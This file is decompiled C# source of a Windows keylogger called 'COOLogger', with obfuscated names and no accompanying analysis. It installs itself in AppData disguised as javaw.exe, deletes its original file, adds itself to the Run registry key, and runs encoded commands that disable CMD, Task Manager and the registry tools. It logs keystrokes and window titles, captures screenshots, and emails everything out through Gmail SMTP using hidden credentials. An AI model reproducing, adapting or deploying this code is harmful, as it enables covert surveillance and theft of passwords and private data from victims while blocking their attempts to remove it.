using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using My;

[StandardModule]
internal sealed class eVuKCmUWrUYmwRf
{
	private static string SFfCBdKcOSrSdXp = "aWs4YXNaZVFURFdBUUdxdU5oVitVWXZ4bWNJQ0VJemM=";

	private static string mJfEvrEUjFsCZUx = "PXdYOVBCSEJmdHd1PU9VV0lwNE4vSGsy";

	private static string zgBGOEjrsqvTahM = "smtp.gmail.com";

	private static int YYnrulLaTDknIko = 587;

	private static string VuKCmUWrUYmwRfS;

	private static string FfCBdKcOSrSdXpm;

	private static string JfEvrEUjFsCZUxz;

	private static string gBGOEjrsqvTahMY;

	private static string YnrulLaTDknIkoD;

	private static string xmSbcafQKRuIHXb;

	private static int itnGpMvGMIUlzIJ = 900000;

	private static string MiuJqItxYMKEWTp = null;

	private static string UYaSrHyjRTnQVit = "UkVHIGFkZCBIS0NVXFNvZnR3YXJlXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXFN5c3RlbSAvdiBEaXNhYmxlQ01EIC90IFJFR19EV09SRCAvZCAxIC9m";

	private static string ObPBcyxZHYLPoPa = "UkVHIGFkZCBIS0NVXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFBvbGljaWVzXFN5c3RlbSAvdiBEaXNhYmxlUmVnaXN0cnlUb29scyAvdCBSRUdfRFdPUkQgL2QgMSAvZg==";

	private static string UmjGcBsoBRgCpyW = "UkVHIGFkZCBIS0NVXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFBvbGljaWVzXFN5c3RlbSAvdiBEaXNhYmxlVGFza01nciAvdCBSRUdfRFdPUkQgL2QgMSAvZg==";

	private static object DyivVVvFRtNsQiI = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

	private static string SpkOQwDWeUzuvty = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

	private static MailMessage jqxOooEuwoOqVTB = new MailMessage();

	private static SmtpClient HlWSGaRIWgPOCoP = new SmtpClient();

	[AccessedThroughProperty("lWSGaRIWgPOCoPl")]
	private static lxMtLxCbPNHZWsP _lWSGaRIWgPOCoPl;

	private static object pBETopzJEhwQjDx = Path.GetFileName(Conversions.ToString(qvgnuLlkBqtlKnS));

	private static RichTextBox bEiTODXOFSdMLyk = new RichTextBox();

	private static object qvgnuLlkBqtlKnS = Application.get_ExecutablePath();

	private static readonly byte[] key = new byte[24]
	{
		1, 2, 3, 4, 5, 6, 7, 8, 9, 10,
		11, 12, 13, 14, 15, 16, 17, 18, 19, 20,
		21, 22, 23, 24
	};

	private static readonly byte[] iv = new byte[8] { 8, 7, 6, 5, 4, 3, 2, 1 };

	private static RuwdwDLzfopnsQX eIVUkoqiIXPzhjF = new RuwdwDLzfopnsQX(key, iv);

	private static lxMtLxCbPNHZWsP lWSGaRIWgPOCoPl
	{
		get
		{
			return _lWSGaRIWgPOCoPl;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_lWSGaRIWgPOCoPl != null)
			{
				lxMtLxCbPNHZWsP.KeyDown -= beVuKCmUWrUYmwR;
			}
			_lWSGaRIWgPOCoPl = value;
			if (_lWSGaRIWgPOCoPl != null)
			{
				lxMtLxCbPNHZWsP.KeyDown += beVuKCmUWrUYmwR;
			}
		}
	} = new lxMtLxCbPNHZWsP();


	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowTextA(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

	[STAThread]
	public static void main()
	{
		//IL_02bb: Unknown result type (might be due to invalid IL or missing references)
		//IL_02c1: Expected O, but got Unknown
		//IL_02e4: Unknown result type (might be due to invalid IL or missing references)
		//IL_02ea: Expected O, but got Unknown
		lWSGaRIWgPOCoPl.ntpBETopzJEhwQj();
		xmSbcafQKRuIHXb = Conversions.ToString(true);
		JfEvrEUjFsCZUxz = Conversions.ToString(true);
		gBGOEjrsqvTahMY = Conversions.ToString(true);
		YnrulLaTDknIkoD = Conversions.ToString(true);
		FfCBdKcOSrSdXpm = Conversions.ToString(true);
		VuKCmUWrUYmwRfS = Conversions.ToString(true);
		object startupPath = Application.get_StartupPath();
		if (!Operators.ConditionalCompareObjectEqual(startupPath, DyivVVvFRtNsQiI, false))
		{
			FileStream fileStream = null;
			fileStream = File.Create(Conversions.ToString(Operators.ConcatenateObject(DyivVVvFRtNsQiI, (object)"\\qxOooEuwoOqVTBp.txt")));
			using (fileStream)
			{
			}
			StreamWriter streamWriter = new StreamWriter(SpkOQwDWeUzuvty + "\\qxOooEuwoOqVTBp.txt");
			streamWriter.Write(RuntimeHelpers.GetObjectValue(qvgnuLlkBqtlKnS));
			streamWriter.Flush();
			streamWriter.Close();
			if (File.Exists(Conversions.ToString(Operators.AddObject(DyivVVvFRtNsQiI, (object)"\\javaw.exe"))))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Conversions.ToString(Operators.AddObject(DyivVVvFRtNsQiI, (object)"\\javaw.exe")));
				((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Conversions.ToString(qvgnuLlkBqtlKnS), Conversions.ToString(Operators.AddObject(DyivVVvFRtNsQiI, (object)"\\javaw.exe")));
			}
			else
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Conversions.ToString(qvgnuLlkBqtlKnS), Conversions.ToString(Operators.AddObject(DyivVVvFRtNsQiI, (object)"\\javaw.exe")));
			}
			NewLateBinding.LateCall((object)null, typeof(Process), "Start", new object[1] { Operators.AddObject(DyivVVvFRtNsQiI, (object)"\\javaw.exe") }, (string[])null, (Type[])null, (bool[])null, true);
			ProjectData.EndApp();
		}
		if (Conversions.ToBoolean(VuKCmUWrUYmwRfS))
		{
			object objectValue = RuntimeHelpers.GetObjectValue(Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.GetValue(Conversions.ToString(pBETopzJEhwQjDx)));
			if (objectValue == null)
			{
				((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", Conversions.ToString(pBETopzJEhwQjDx), Operators.ConcatenateObject(Operators.ConcatenateObject(DyivVVvFRtNsQiI, (object)"\\"), pBETopzJEhwQjDx));
			}
		}
		if (Conversions.ToBoolean(FfCBdKcOSrSdXpm))
		{
			try
			{
				object obj = ((ServerComputer)MyProject.Computer).get_FileSystem().ReadAllText(Conversions.ToString(Operators.ConcatenateObject(DyivVVvFRtNsQiI, (object)"\\qxOooEuwoOqVTBp.txt")));
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Conversions.ToString(obj));
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		if (Conversions.ToBoolean(JfEvrEUjFsCZUxz))
		{
			Interaction.Shell(bPBcyxZHYLPoPaU(UYaSrHyjRTnQVit), (AppWinStyle)1, false, -1);
		}
		if (Conversions.ToBoolean(gBGOEjrsqvTahMY))
		{
			Interaction.Shell(bPBcyxZHYLPoPaU(ObPBcyxZHYLPoPa), (AppWinStyle)1, false, -1);
		}
		if (Conversions.ToBoolean(YnrulLaTDknIkoD))
		{
			Interaction.Shell(bPBcyxZHYLPoPaU(UmjGcBsoBRgCpyW), (AppWinStyle)1, false, -1);
		}
		Timer val = new Timer();
		val.set_Interval(900000);
		val.add_Tick((EventHandler)xMtLxCbPNHZWsPn_Ticked);
		val.Start();
		Timer val2 = new Timer();
		val2.set_Interval(300);
		val2.add_Tick((EventHandler)tpBETopzJEhwQjD_Ticked);
		val2.Start();
		Application.Run();
	}

	private static string DYZiHnRgNTmukQL()
	{
		string lpString = new string('\0', 100);
		GetWindowTextA(GetForegroundWindow(), ref lpString, 100);
		return lpString.Substring(0, checked(Strings.InStr(lpString, "\0", (CompareMethod)0) - 1));
	}

	public static string bPBcyxZHYLPoPaU(string IVUkoqiIXPzhjFh)
	{
		byte[] bytes = Convert.FromBase64String(IVUkoqiIXPzhjFh);
		return Encoding.ASCII.GetString(bytes);
	}

	public static void xMtLxCbPNHZWsPn_Ticked(object sender, EventArgs e)
	{
		//IL_0076: Unknown result type (might be due to invalid IL or missing references)
		//IL_007c: Expected O, but got Unknown
		if (Conversions.ToBoolean(xmSbcafQKRuIHXb))
		{
			Size size = new Size(((Computer)MyProject.Computer).get_Screen().get_Bounds().Width, ((Computer)MyProject.Computer).get_Screen().get_Bounds().Height);
			Bitmap val = new Bitmap(((Computer)MyProject.Computer).get_Screen().get_Bounds().Width, ((Computer)MyProject.Computer).get_Screen().get_Bounds().Height);
			Graphics val2 = Graphics.FromImage((Image)(object)val);
			Point point = new Point(0, 0);
			Point point2 = new Point(0, 0);
			val2.CopyFromScreen(point, point2, size);
			string text = gzujPYZXcNGNrFE(6);
			((Image)val).Save(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(DyivVVvFRtNsQiI, (object)"\\"), (object)text), (object)".jpeg")));
			try
			{
				MailMessage mailMessage = new MailMessage();
				Attachment item = new Attachment(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(DyivVVvFRtNsQiI, (object)"\\"), (object)text), (object)".jpeg")));
				mailMessage.From = new MailAddress(eIVUkoqiIXPzhjF.hlzvesRSsCOqKoN(fFfqkDlJsDJFRhw(bPBcyxZHYLPoPaU(SFfCBdKcOSrSdXp))));
				mailMessage.To.Add(eIVUkoqiIXPzhjF.hlzvesRSsCOqKoN(fFfqkDlJsDJFRhw(bPBcyxZHYLPoPaU(SFfCBdKcOSrSdXp))));
				mailMessage.Subject = "COOLogger Logs From - " + Environment.UserName;
				mailMessage.Body = bEiTODXOFSdMLyk.get_Text();
				mailMessage.Attachments.Add(item);
				SmtpClient smtpClient = new SmtpClient("smtp.gmail.com");
				smtpClient.Port = 587;
				smtpClient.EnableSsl = true;
				smtpClient.Credentials = new NetworkCredential(eIVUkoqiIXPzhjF.hlzvesRSsCOqKoN(fFfqkDlJsDJFRhw(bPBcyxZHYLPoPaU(SFfCBdKcOSrSdXp))), eIVUkoqiIXPzhjF.hlzvesRSsCOqKoN(fFfqkDlJsDJFRhw(bPBcyxZHYLPoPaU(mJfEvrEUjFsCZUx))));
				smtpClient.EnableSsl = true;
				smtpClient.Send(mailMessage);
				bEiTODXOFSdMLyk.set_Text("");
				return;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return;
			}
		}
		MailMessage mailMessage2 = jqxOooEuwoOqVTB;
		mailMessage2.From = new MailAddress(eIVUkoqiIXPzhjF.hlzvesRSsCOqKoN(fFfqkDlJsDJFRhw(bPBcyxZHYLPoPaU(SFfCBdKcOSrSdXp))));
		mailMessage2.To.Add(eIVUkoqiIXPzhjF.hlzvesRSsCOqKoN(fFfqkDlJsDJFRhw(bPBcyxZHYLPoPaU(SFfCBdKcOSrSdXp))));
		mailMessage2.Subject = "COOLogger Logs from - " + Environment.UserName;
		mailMessage2.Body = bEiTODXOFSdMLyk.get_Text();
		mailMessage2 = null;
		SmtpClient hlWSGaRIWgPOCoP = HlWSGaRIWgPOCoP;
		hlWSGaRIWgPOCoP.Host = "smtp.gmail.com";
		hlWSGaRIWgPOCoP.Port = 587;
		hlWSGaRIWgPOCoP.EnableSsl = true;
		hlWSGaRIWgPOCoP.Credentials = new NetworkCredential(eIVUkoqiIXPzhjF.hlzvesRSsCOqKoN(fFfqkDlJsDJFRhw(bPBcyxZHYLPoPaU(SFfCBdKcOSrSdXp))), eIVUkoqiIXPzhjF.hlzvesRSsCOqKoN(fFfqkDlJsDJFRhw(bPBcyxZHYLPoPaU(mJfEvrEUjFsCZUx))));
		hlWSGaRIWgPOCoP.Send(jqxOooEuwoOqVTB);
		hlWSGaRIWgPOCoP = null;
		bEiTODXOFSdMLyk.set_Text("");
	}

	public static void beVuKCmUWrUYmwR(Keys e)
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		RichTextBox val = bEiTODXOFSdMLyk;
		val.set_Text(val.get_Text() + lWSGaRIWgPOCoPl.DxmSbcafQKRuIHX(e));
	}

	public static void tpBETopzJEhwQjD_Ticked(object sender, EventArgs e)
	{
		if (Operators.CompareString(MiuJqItxYMKEWTp, DYZiHnRgNTmukQL(), false) != 0)
		{
			MiuJqItxYMKEWTp = DYZiHnRgNTmukQL();
			if (Operators.CompareString(MiuJqItxYMKEWTp, "", false) != 0)
			{
				RichTextBox val = bEiTODXOFSdMLyk;
				val.set_Text(val.get_Text() + "\r\n\r\n~~~~~" + MiuJqItxYMKEWTp + " (" + DateAndTime.get_Now().ToLongTimeString() + ")~~~~~\r\n");
			}
		}
	}

	public static string gzujPYZXcNGNrFE(int lenght)
	{
		VBMath.Randomize();
		StringBuilder stringBuilder = new StringBuilder("");
		char[] array = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".ToCharArray();
		checked
		{
			for (int i = 1; i <= lenght; i++)
			{
				VBMath.Randomize();
				int num = (int)Math.Round(Conversion.Int((float)(array.Length - 2 - 0 + 1) * VBMath.Rnd()) + 1f);
				stringBuilder.Append(array[num]);
			}
			return stringBuilder.ToString();
		}
	}

	public static string fFfqkDlJsDJFRhw(string sInput)
	{
		string text = "";
		int length = sInput.Length;
		int num = length % 2;
		int num2 = length / 2;
		checked
		{
			for (int i = num2 + num; i >= 1; i += -1)
			{
				if (num == 0)
				{
					text += Strings.Mid(sInput, i + num2, 1);
				}
				text += Strings.Mid(sInput, i, 1);
				if (unchecked(num == 1 && i != 1))
				{
					text += Strings.Mid(sInput, i + num2, 1);
				}
			}
			return text;
		}
	}
}
